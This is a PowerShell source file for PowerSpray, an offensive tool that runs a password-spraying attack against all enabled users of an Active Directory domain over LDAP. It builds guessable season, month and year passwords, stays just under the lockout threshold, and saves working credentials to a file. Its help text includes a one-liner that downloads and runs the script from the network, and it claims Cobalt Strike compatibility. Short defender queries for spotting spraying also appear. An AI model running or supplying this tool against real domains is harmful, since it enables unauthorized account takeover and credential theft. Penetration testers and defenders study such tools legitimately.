 Function PowerSpray {
    <#

    .SYNOPSIS

        PowerSpray.ps1 Function: PowerSpray
        Author: John Cartrett (@jnqpblc)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This module is a simple script to perform a password spraying attack against all users of a domain using LDAP and is compatible with Cobaltstrike.
        By default it will automatically generate the UserList from the domain.
        By default it will automatically generate the PasswordList using the current date.
        Be careful not to lockout any accounts.

	PS C:\> IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/jnqpblc/Misc-PowerShell/master/PowerSpray.ps1"); PowerSpray

    .LINK

        https://github.com/tallmega/PowerSpray
        https://serverfault.com/questions/276098/check-if-user-password-input-is-valid-in-powershell-script
        https://social.technet.microsoft.com/wiki/contents/articles/4231.working-with-active-directory-using-powershell-adsi-adapter.aspx
	https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing
        https://blog.fox-it.com/2017/11/28/further-abusing-the-badpwdcount-attribute/
	
    .DETECTION
    
    	[DC01] PS C:\> Get-ADUser -LDAPFilter "(&(objectClass=User)(badPasswordTime=*))" -Prop lastbadpasswordattempt,badpwdcount | Select-Object name,lastbadpasswordattempt,badpwdcount | Sort-Object lastbadpasswordattempt,badpwdcount | format-table -auto                                        
    	[DC01] PS C:\> $Date = (Get-Date).AddDays(-1); Get-WinEvent -FilterHashTable @{ LogName = "Security"; StartTime = $Date; ID = 4776 }
    	https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing

    .PARAMETER Passwords

        A comma-separated list of passwords to use instead of the internal list generator.

    .PARAMETER Seeds

        A comma-separated list of passwords to as a seed to the internal list generator.

    .PARAMETER Delay

        The delay time between guesses in millisecounds.

    .PARAMETER Sleep

        The number of minutes to sleep between password cycles.

    .PARAMETER AdSite

        Select what AD Site to connect to: either GetComputerSite() or GetCurrentDomain() for current user.

    .PARAMETER Server

        The server type to use: Either the PDC or a local BridgeHead.

    .EXAMPLE

        PowerSpray
        PowerSpray -Delay 1000 -Sleep 10
        PowerSpray -Seeds Password,Welcome,Cougars,Football
        PowerSpray -Passwords "Password1,Password2,Password1!,Password2!"
        PowerSpray -Batch 3 -Delay 0 -Sleep 10 -AdSite Computer -Server PDC

    #> 
    param (
        [parameter(Mandatory=$false, HelpMessage="A comma-separated list of passwords to use instead of the internal list generator.")]
        [string[]]$Passwords,

        [parameter(Mandatory=$false, HelpMessage="A comma-separated list of passwords to use as a seed for the internal list generator.")]
        [string[]]$Seeds,

        [parameter(Mandatory=$false, HelpMessage="The delay time between password guesses in milliseconds.")]
        [int]$Delay,

        [parameter(Mandatory=$false, HelpMessage="The number of minutes to sleep between password cycles.")]
        [int]$Sleep,

        [parameter(Mandatory=$false, HelpMessage="The number of password cycles to try before sleeping. Default is 1.")]
        [int]$Batch = 1,

        [parameter(Mandatory=$false, HelpMessage="Set the AD Site to use: User or Computer. Default is Computer.")]
        [ValidateSet("User", "Computer")]
        [string]$AdSite = "Computer",

        [parameter(Mandatory=$false, HelpMessage="Set the server to be used: PDC or Bridgehead. Default is Bridgehead.")]
        [ValidateSet("PDC", "Bridgehead")]
        [string]$Server = "Bridgehead"
    )

    # Define the path to the cache file
    $cacheFilePath = 'UserList.xml'

    try {
        if ($AdSite -eq "User") {
            if ($Server -eq "PDC") {
                $LogonServer = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name;
            }
            if ($Server -eq "Bridgehead") {
                $LogonServer = [System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().InterSiteTopologyGenerator.Name;
            }
        }
        if ($AdSite -eq "Computer") {
            if ($Server -eq "PDC") {
                $LogonServer = [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().PdcRoleOwner.Name;
            }
            if ($Server -eq "Bridgehead") {
                $LogonServer = [System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().InterSiteTopologyGenerator.Name;
            }
        }

        # Retrieve the domain controller object using the LDAP path with the LogonServer value
        $objDC = [ADSI] "LDAP://$($LogonServer)";

        # Initialize a new DirectorySearcher object
        $Searcher = New-Object DirectoryServices.DirectorySearcher;
        
        # Set the filter for the search; in this case, we're looking for people with account names that aren't disabled
        $Searcher.Filter = '(&(objectCategory=Person)(sAMAccountName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))';
        
        # Set the PageSize to 1000 for efficient paging of results
        $Searcher.PageSize = 1000;
        
        # Add the "sAMAccountName" property to the list of properties to load for each result
        $Searcher.PropertiesToLoad.Add("sAMAccountName") > $Null
        
        # Set the root of the search to the current domain controller
        $Searcher.SearchRoot = $objDC;

        # Check if the cache file exists
        if (Test-Path -Path $cacheFilePath) {
            # Load UserList from the cache file
            $UserList = Import-Clixml -Path $cacheFilePath
            $UserCount = $UserList.Count
            Write-Output "[+] Successfully loaded $UserCount usernames from cache."
        } else {
            # Cache file doesn't exist; Retrieve the user list from Active Directory
            # Perform the search and save the account names from the results to UserList
            $UserList = $Searcher.FindAll().Properties.samaccountname

            # Save the UserList to a cache file
            $UserList | Export-Clixml -Path $cacheFilePath
            $UserCount = $UserList.Count
            Write-Output "[+] Successfully retrieved and cached $UserCount usernames from Active Directory."
        } 
    } catch {
        # There was an error connecting to Active Directory, so output an error message and stop the script
        $e = $_.Exception.InnerException.Message
        Write-Error "[-] Failed to find or connect to Active Directory : $e"
        Break
    }

    try {
        # Throw an exception if UserList is null or empty
        if ([string]::IsNullOrEmpty($UserList)) {
            Write-Error "[-] Failed to retrieve the usernames from Active Directory or the cache."
            Break
        }

        # Retrieve and output the lockout threshold for the current domain
        $lockoutThreshold = [int]$objDC.lockoutThreshold.Value
        Write-Output "[*] The Lockout Threshold for the current domain is $lockoutThreshold."

        # Retrieve and output the minimum password length for the current domain
        $minPwdLength = [int]$objDC.minPwdLength.Value
        Write-Output "[*] The Min Password Length for the current domain is $minPwdLength."
    } 
    catch {
        # Output the error message and exit the script
        $e = $_.Exception.InnerException.Message
        Write-Error "[-] The was en error getting the lockoutThreshold or the minPwdLength : $e"
        Break
    }

    $SeedList = @()
    $PasswordList = @()

    # Check if 'Passwords' parameter is provided when the script is invoked.
    if ($PSBoundParameters.ContainsKey('Passwords')) {
        # If provided, assign it to the $PasswordList variable.
        $PasswordList = $Passwords
    } 
    # Check if 'Seeds' parameter is provided when the script is invoked.
    elseif ($PSBoundParameters.ContainsKey('Seeds')) {
        # Generate password list using 'Seeds' if provided.
        $PasswordList = Generate-Passwords -SeedList $Seeds
    } 
    else {
        # If neither 'Passwords' nor 'Seeds' parameters are provided,
        # generate password list using current and neighboring months and seasons as seeds.

        # Get current and neighboring seasons
        $SeasonList = 1..3 | ForEach-Object {
            Get-Season -Date (Get-Date).AddMonths($_ - 2)
        } | Sort-Object -Unique

        # Get current and neighboring month names
        $MonthList = 0..2 | ForEach-Object {
            (Get-Culture).DateTimeFormat.GetMonthName((Get-Date).AddMonths($_ - 1).Month)
        }

        # Generate the password list using a combination of season and month names
        $PasswordList = Generate-Passwords -SeedList ($SeasonList + $MonthList) -MinPwdLength $minPwdLength
    }

    # Randomly sort the password list.
    $PasswordList = $PasswordList | Sort-Object {Get-Random}

    # Validate the Batch and Sleep parameters
    if (($null -eq $Batch) -or ($Batch -eq 0)) {
        Write-Error "[-] Invalid or missing Batch parameter; the script will exit."
        Break
    }
    if (($null -eq $Sleep) -or ($Sleep -eq 0)) {
        Write-Error "[-] Invalid or missing Sleep parameter; the script will exit."
        Break
    }

    # Check if the password list is null or empty.
    if ([string]::IsNullOrEmpty($PasswordList)) {
        # If it is, write an error message and stop the script.
        Write-Error "[-] The PasswordList variable is empty; the script will exit."
        Break
    }

    # Write a success message with the count of passwords.
    Write-Output "[+] Successfully generated a list of $($PasswordList.Count) passwords."

    # Calculate estimated time to complete the process in hours.
    $T2C = $((($PasswordList.Count/$Batch)*$Sleep)/60).tostring("#.##")

    # Write an informational message about the estimated time.
    Write-Output "[*] This process should take approximately $T2C hours to complete and will output successful passwords to SuccessLogins.txt"

    # Initialize a counter.
    $Counter = 1

    # Write an informational message about the start of password spraying operations.
    Write-Output "[*] Starting password spraying operations against $LogonServer. Counter is set to $Counter"

    # Get the domain reference outside the loop, it won't change for each user.
    $CurrentDomain = "LDAP://" + $LogonServer
    if ([string]::IsNullOrEmpty($CurrentDomain)) {
        Write-Error "[-] Failed to retrieve the domain name; the script will exit."
        return # Exit script after error.
    }

    # Default sleep delay. 
    $SleepDelay = if ($PSBoundParameters.ContainsKey('Delay')) { $Delay } else { 1000 }

    # Loop through each password in the password list.
    foreach ($Password in $PasswordList)
    {
        Write-Output "[*] Using password $Password"
        
        # Loop through each user in the user list.
        foreach ($UserName in $UserList)
        {
            # Retrieve the user's badPwdCount attribute using LDAP query
            $searchFilter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=$UserName))"
            $attributeList = @("badPwdCount")

            # Initialize a new DirectorySearcher object
            $searcher = New-Object System.DirectoryServices.DirectorySearcher
            $searcher.Filter = $searchFilter
            $searcher.PropertiesToLoad.AddRange($attributeList)

            # Set the root of the search to the current domain controller
            $searcher.SearchRoot = $objDC

            # Perform the search and retrieve the first result
            $searchResult = $searcher.FindOne()

            if ($searchResult)
            {
                $badPwdCount = $searchResult.Properties["badPwdCount"][0]
                Write-Verbose "User: $UserName, BadPwdCount: $badPwdCount"
            }
            else
            {
                Write-Warning "Failed to retrieve badPwdCount for user: $UserName"
                Continue  # Skip to the next user
            }

            # Attempt to authenticate with the current username/password only if badPwdCount is less than two of lockoutThreshold
            if (($null -ne $badPwdCount) -and ($badPwdCount -lt ($lockoutThreshold - 2)))
            {
                try {
                    $Domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $UserName, $Password)
                    $Domain.Dispose()

                    # Check if the authentication was successful.
                    if ($null -ne $Domain.Name) {
                        $Success = "[+] Successfully authenticated on $CurrentDomain with $UserName::$Password"
                        Write-Output $Success
                        # Saving successful logins to a file.
                        $Success | Out-File -FilePath 'SuccessLogins.txt' -Append
                    }
                }
                catch {
                    # Output the error message and exit the script
                    $e = $_.Exception.InnerException.Message
                    Write-Verbose "[-] Authentication failed on $CurrentDomain for $UserName : $e"
                }
            }
            else {
                Write-Verbose "[-] Skipping $UserName becuase their badPwdCount is $badPwdCount, and the lockoutThreshold is $lockoutThreshold"
            }

            # Sleep for delay duration.
            Start-Sleep -Milliseconds $SleepDelay
        }

        Write-Output "[*] Completed all rounds with password $Password. Counter was $Counter"
        $Counter += 1

        if ($Counter -gt $Batch)
        {
            $Counter = 1
            if ($PSBoundParameters.ContainsKey('Sleep')) {
                $Duration = (New-Timespan -Minutes $Sleep).TotalSeconds
                $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Write-Output "[*] [$Timestamp] Now the script will sleep for $Duration seconds. Counter is $Counter"
                Start-Sleep -Seconds $Duration
            }
        }

    }

    Write-Output "[*] Completed all password spraying operations."

}

Function Get-Season() {
    param (
        [parameter(Mandatory=$true, HelpMessage="Enter a datetime.")]
        [datetime]$Date
    ) 

    # Define the start dates for each season based on the input year
    $Winter = Get-Date "01/01/$($Date.Year)"
    $Spring = Get-Date "03/20/$($Date.Year)"
    $Summer = Get-Date "06/21/$($Date.Year)"
    $Autumn = Get-Date "09/22/$($Date.Year)"
    $Winter2 = Get-Date "12/21/$($Date.Year)"

    # Determine the season based on the input date
    if (($Date -ge $Winter) -and ($Date -lt $Spring)) {return "Winter"}
    elseif (($Date -ge $Spring) -and ($Date -lt $Summer)) {return "Spring"}
    elseif (($Date -ge $Summer) -and ($Date -lt $Autumn)) {return "Summer"}
    elseif (($Date -ge $Autumn) -and ($Date -lt $Winter2)) {return "Autumn"}
    else {return "Winter"} # Winter extends into the next year after 21st Dec
}


Function Generate-Passwords {
    param (
        [string[]]$SeedList,
        [int]$MinPwdLength
    )

    # Check if the SeedList is empty
    if ([string]::IsNullOrEmpty($SeedList)) {
        Write-Error "[-] The SeedList variable is empty; the script will exit."
        return
    }

    $PasswordList = foreach ($Seed in $SeedList) {
        $AppendList = @(
            (Get-Date -UFormat %y),
            "$(Get-Date -UFormat %y)!",
            (Get-Date).Year,
            "$((Get-Date).Year)!",
            "1",
            "2",
            "3",
            "1!",
            "2!",
            "3!",
            "123",
            "1234",
            "123!",
            "1234!"
        )

        # Generate passwords using the SeedList and AppendList
        $PasswordList = $AppendList | ForEach-Object {
            $Candidate = $Seed + $_

            # Check if the password length meets the minimum requirement
            if ($Candidate.Length -ge $MinPwdLength) {
                $Candidate
            }
        }

        $PasswordList
    }

    return $PasswordList
}
